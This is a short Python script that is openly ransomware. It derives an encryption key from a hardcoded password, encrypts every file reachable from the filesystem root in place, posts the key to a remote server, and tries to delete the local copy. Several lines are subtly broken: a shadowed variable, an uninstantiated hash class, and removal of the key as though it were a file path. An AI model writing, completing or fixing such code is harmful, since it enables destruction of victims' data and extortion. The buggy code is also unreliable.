import os
import json
import base64
from cryptography.fernet import Fernet
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC

# Define the server to send the key to
server = "https://example.com"

# Define password to use for key derivation
password = b"supersecretpassword"

# Salt for key derivation
salt = b"salt"

# Derive key from password and salt
kdf = PBKDF2HMAC(
    algorithm=hashes.SHA256,
    length=32,
    salt=salt,
    iterations=100000,
    backend=default_backend()
)
key = base64.urlsafe_b64encode(kdf.derive(password))

# Create Fernet object
f = Fernet(key)

# Encrypt all files in the system
for root, dirs, files in os.walk("/"):
    for file in files:
        file_path = os.path.join(root, file)
        with open(file_path, "rb") as f:
            data = f.read()
        encrypted = f.encrypt(data)
        with open(file_path, "wb") as f:
            f.write(encrypted)

# Send key to server
# Import requests library if it is not already imported
import requests

requests.post(server, json={"key": key.decode()})

# Remove key from local system
os.remove(key)
